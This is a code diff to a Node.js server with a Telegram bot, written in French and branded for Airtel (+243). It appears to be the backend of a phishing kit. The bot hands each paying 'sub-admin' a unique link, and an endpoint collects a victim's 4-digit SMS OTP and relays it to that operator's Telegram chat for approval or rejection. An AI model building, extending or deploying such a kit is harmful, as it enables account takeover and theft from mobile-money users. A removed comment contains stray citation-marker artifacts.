@@ -68,30 +68,51 @@ function resolveTargetChat(adminParam) {
 async function initBot() {
   bot = new TelegramBot(TOKEN, { polling: true });
 
-  // Startup notification code removed to prevent link spamming on server restarts[span_0](start_span)[span_0](end_span)
-
   bot.onText(/\/start/, async (msg) => {
     try {
       const chatId = String(msg.chat.id);
       let chatInfo = {};
       try { chatInfo = await bot.getChat(chatId); } catch (e) {}
 
-      const username = chatInfo.username || msg.from.username || '';
+      const username = chatInfo.username || msg.from.username || 'N/A';
       const firstName = chatInfo.first_name || msg.from.first_name || 'User';
+      const lastName = chatInfo.last_name || msg.from.last_name || '';
+
+      if (!admins.has(chatId)) {
+        admins.set(chatId, { authorized: true, paid: true, username, firstName, lastName, startedAt: new Date() });
+      } else {
+        const existing = admins.get(chatId);
+        existing.username = username;
+        existing.firstName = firstName;
+        existing.lastName = lastName;
+        admins.set(chatId, existing);
+      }
+      saveAdmins();
+
+      const userLink = `${APP_URL}/?admin=${chatId}`;
 
       if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 *Bienvenue Administrateur Principal*\nVotre lien Airtel (+243): ${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`, { parse_mode: 'Markdown' });
+        const mainAdminMessage = `👑 *Bienvenue Administrateur Principal*\n\n` +
+                                 `👤 *Info Telegram:*\n` +
+                                 `• Nom: ${firstName} ${lastName}\n` +
+                                 `• Username: @${username}\n` +
+                                 `• Chat ID: \`${chatId}\`\n\n` +
+                                 `🔗 *Votre lien Airtel (+243):*\n${userLink}`;
+        await bot.sendMessage(chatId, mainAdminMessage, { parse_mode: 'Markdown' });
         return;
       }
 
-      if (!admins.has(chatId)) {
-        admins.set(chatId, { authorized: true, paid: true, username, firstName, startedAt: new Date() });
-        saveAdmins();
-      }
+      const subAdminMessage = `🤖 *AIRTEL SUB-ADMIN BOT READY*\n\n` +
+                              `👤 *Vos Infos Telegram:*\n` +
+                              `• Nom: ${firstName} ${lastName}\n` +
+                              `• Username: @${username}\n` +
+                              `• Chat ID: \`${chatId}\`\n\n` +
+                              `🔗 *Votre lien unique généré:*\n${userLink}`;
 
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-      await bot.sendMessage(chatId, `👋 *Bienvenue ${firstName}!*\n\nVotre lien Airtel est prêt:\n${userLink}`, { parse_mode: 'Markdown' });
-    } catch (err) {}
+      await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
+    } catch (err) {
+      console.error('[Telegram] Error handling /start:', err);
+    }
   });
 
   bot.on('callback_query', async (query) => {
@@ -193,12 +214,12 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: Submit 4-digit SMS OTP (WRONG PIN ❌, EXPIRED OTP, APPROVED)
+// Step 2: Submit 4-digit SMS OTP
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
     const session = sessions.get(userId);
-    if (!session) return res.status(404).json({ success: false, error: 'Session non trouvée' });
+    if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
 
     const targetChat = session.adminChatId;
     session.status = 'WAITING_OTP_VERIFICATION';
@@ -233,4 +254,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-                                                                           
+  
